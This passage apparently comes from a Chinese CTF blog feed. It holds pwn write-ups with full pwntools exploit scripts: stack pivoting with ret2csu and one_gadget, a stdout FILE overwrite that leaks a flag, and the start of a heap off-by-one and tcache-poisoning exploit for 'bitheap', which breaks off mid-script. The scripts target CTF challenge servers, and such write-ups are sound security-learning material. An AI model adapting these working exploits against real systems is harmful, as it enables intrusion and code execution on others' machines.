class="hljs-number">0xe0</span>+<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) +p64(system)<br>edit(-<span class="hljs-number">4</span>,fake_IO_FILE)<br><span class="hljs-comment">#debug()</span><br>sl(<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="WEEK5">WEEK5</h2><h3 id="overflow-me-plz">overflow me plz</h3><p>依旧是栈迁移到bss段，ret2csu构造wirte来泄露libc，然后one_gadget</p><p>(本来想再次迁移rop来做的，到最后程序也成功执行了system(/bin/sh)了就是没shell）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select =<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29722</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rdi,rsi,rdx,function</span>):<br>    csu_front_addr=<span class="hljs-number">0x400740</span><br>    csu_end_addr=<span class="hljs-number">0x40075A</span><br>    payload = <span class="hljs-string">b&#x27;&#x27;</span><br>    payload += p64(csu_end_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(function) + p64(<br>        rdi) + p64(rsi) + p64(rdx)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-keyword">return</span> payload<br><span class="hljs-comment">#-----------------</span><br>bss=<span class="hljs-number">0x601040</span>+<span class="hljs-number">0x200</span><br>leave_ret=<span class="hljs-number">0x00000000004006f7</span> <span class="hljs-comment"># leave ; ret</span><br>main_read=<span class="hljs-number">0x4006D9</span><br>main=<span class="hljs-number">0x400698</span><br>pd=flat(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0xc0</span>,bss+<span class="hljs-number">0xc0</span>,main_read)<br>sea(<span class="hljs-string">&#x27;Show me if you can pwn it!\n&#x27;</span>,pd)<br><br>pd1=csu(<span class="hljs-number">1</span>,elf.got[<span class="hljs-string">&#x27;write&#x27;</span>],<span class="hljs-number">0x8</span>,elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p64(main)<br>pd1=pd1.ljust(<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pd1+=p64(bss-<span class="hljs-number">8</span>)+p64(leave_ret)<br><span class="hljs-comment">#debug()</span><br>se(pd1)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br>og=[<span class="hljs-number">0xe3afe</span>,<span class="hljs-number">0xe3b01</span>,<span class="hljs-number">0xe3b04</span>]<br>se(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc8</span>+p64(libc_base+og[<span class="hljs-number">0</span>]))<br><br><span class="hljs-comment">#system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="hljs-comment">#pop_rdi=0x0000000000400763</span><br><span class="hljs-comment">#ret=0x40050e</span><br><span class="hljs-comment">#binsh=libc_base+0x1B45BD</span><br><span class="hljs-comment">#pd2=flat(&#x27;\x00&#x27;*0xc0,bss+0xc0,main_read)</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#sea(&#x27;Show me if you can pwn it!\n&#x27;,pd2)</span><br><span class="hljs-comment">#pop_rsi_r15=0x400761</span><br><span class="hljs-comment">#pd3=flat(ret,pop_rdi,binsh,system)</span><br><span class="hljs-comment">#pd3.ljust(0xc0,b&#x27;\x00&#x27;) </span><br><span class="hljs-comment">#pd3+=p64(bss-8)+p64(leave_ret)</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#se(pd3)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="leak-me-plz">leak me plz</h3><p>程序在0x233000的地址读入了flag</p><p>告诉了我们libc地址，还有任意地址写0x38长度</p><p>打stdout改p64(0xfbad1800)+p64(0)*3+p64(mmap)+p64(mmap+0x40)+p64(0)</p><p>遇到puts会打印从mmap到mmap+0x40)的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>mmap=<span class="hljs-number">0x233000</span><br>ru(<span class="hljs-string">&#x27;Here is your gift: 0x&#x27;</span>)<br>libc_base=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>stdout=libc_base+<span class="hljs-number">0x1ed6a0</span><br><span class="hljs-comment">#debug()</span><br>se(p64(stdout))<br><span class="hljs-comment">#debug()</span><br>payload=p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(mmap)+p64(mmap+<span class="hljs-number">0x40</span>)+p64(<span class="hljs-number">0</span>)<br>se(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="小结">小结</h2><p>还有5道题没整出来，记录一下，懒得整了，分别为：</p><p>这是堆🐎--------IO利用,orw无open</p><p>KMario------------kernel_pwn</p><p>code me plz-----shellcode，orw无open</p><p>Farewell----------kernel_pwn</p><p>orw me plz------也是orw没有open的情况</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>整数溢出</tag>
      
      <tag>数组越界</tag>
      
      <tag>IO_leak</tag>
      
      <tag>orw</tag>
      
      <tag>shellocde</tag>
      
      <tag>ret2libc</tag>
      
      <tag>ret2shellocde</tag>
      
      <tag>GOT Hijacking</tag>
      
      <tag>format</tag>
      
      <tag>ret2csu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022第三届祥云杯网络安全大赛pwn</title>
    <link href="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/"/>
    <url>/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/</url>
    
    <content type="html"><![CDATA[<h2 id="前言：">前言：</h2><p>就做出了两道pwn，分别为bitheap和unexploitable，也是比赛中解出人数最多的两道pwn。先放这两道题目，后续复现了其他题目再上传。</p><h2 id="bitheap">bitheap</h2><p>这题与sandboxheap是同一道题，只是后者多加了个沙盒保护。但是这题是在sandboxheap后面放出来的…</p><h3 id="0x01程序分析">0x01程序分析</h3><p>libc版本Ubuntu GLIBC 2.27-3ubuntu1.6，这次比赛几乎都是2.27的</p><p>保护全开</p><p>程序存在off by one</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/bitheapbug.png" alt="bitheapbug"></p><p>然后同样在edit功能里有个函数，有一个对每个字节逆序的操作</p><blockquote><p>例：如果我们要输入0x02</p><p>就要输入字符串  <code>’01000000‘</code>,它是<code>‘00000010’</code>的逆序</p></blockquote><p>我们要写个函数处理下它的转换</p><p>然后其他功能都齐全了</p><h3 id="0x02利用思路">0x02利用思路</h3><p>这题的解法和去年的[PassWordBox_FreeVersion](<a href="https://blog.csdn.net/m0_51251108/article/details/127452277?spm=1001.2014.3001.5501">2021 祥云杯PassWordBox_FreeVersion_Nqoinaen的博客-CSDN博客</a>)很像</p><p>我们就用off by null，通过堆风水使unsortbin向上合并，造成堆块重叠，使两个堆申请到同一块地址，顺便泄露了libc,heap的地址</p><p>接着我们造成tcache poisoning ，我们可以指向free_hook，可以改free_hook为setcontext+53,写入orw</p><p>亦可以直接改free_hook为system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./bitheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;101.201.71.136&#x27;</span>, <span class="hljs-number">23712</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#------------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<span class="hljs-comment">#0~6</span><br>    add(i,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x28</span>)<br><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x28</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">0x38</span>+<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">4</span>)<br><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">12</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0xa0</span>)<br>show(<span class="hljs-number">10</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_base<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]+libc_base<br>info(<span class="hljs-string">&#x27;free_hook&#x27;</span>,free_hook)<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x18</span>)<span class="hljs-comment">#10</span><br>delete(<span class="hljs-number">14</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">intToBit</span>(<span class="hljs-params">n</span>):<br>        bits = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> n&gt;<span class="hljs-number">0</span>:<br>            bits = <span class="hljs-built_in">str</span>(n%<span class="hljs-number">2</span>) + bits<br>            n = n//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(bits)!=<span class="hljs-number">8</span>:<br>            bits = <span class="hljs-string">&quot;0&quot;</span>+bits<br>        <span class="hljs-keyword">return</span> bits<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bitToInt</span>(<span class="hljs-params">n</span>):<br>        <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)):<br>            <span class="hljs-built_in">sum</span> += <span class="hljs-built_in">int</span>(n[i])*<span class="hljs-number">2</span>**(<span class="hljs-built_in">len</span>(n)-i-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverseBits</span>(<span class="hljs-params">n</span>):<br>        <span class="hljs-keyword">if</span> n==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>        bits = intToBit(n)<br>        <span class="hljs-keyword">return</span> bitToInt(bits[::-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">n</span>):<br>    n8=(n/(<span class="hljs-number">0x100000000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n7=(n/(<span class="hljs-number">0x1000000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n6=(n/(<span class="hljs-number">0x10000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n5=(n/(<span class="hljs-number">0x100000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n4=(n/(<span class="hljs-number">0x1000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n3=(n/(<span class="hljs-number">0x10000</span>))&amp;<span class="hljs-number">0xff</span><br>    n2=(n/(<span class="hljs-number">0x100</span>))&amp;<span class="hljs-number">0xff</span><br>    n1=(n/<span class="hljs-number">0x1</span>)&amp;<span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> ((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n1))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n2))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n3))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n4))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n5))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n6))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;0&#x27;</span>)+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n7))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>)+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n8))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))<br><br><span class="hljs-comment">#print(hex(reverseBits(0x7f)))</span><br>setcontext=libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">53</span><br><br><br>edit(<span class="hljs-number">10</span>,change(<span class="hljs-number">0x6161616161616161</span>))<br>show(<span class="hljs-number">10</span>)<br>ru(<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0xa10</span>+<span class="hljs-number">0xa00</span><br>info(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br>edit(<span class="hljs-number">10</span>,change(free_hook))<br><br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x18</span>)<br><br><br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x18</span>)<br><br>edit(<span class="hljs-number">15</span>,change(setcontext)  ) <br>pop_rdi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>)))<br>pop_rsi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>)))<br>pop_rdx = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop 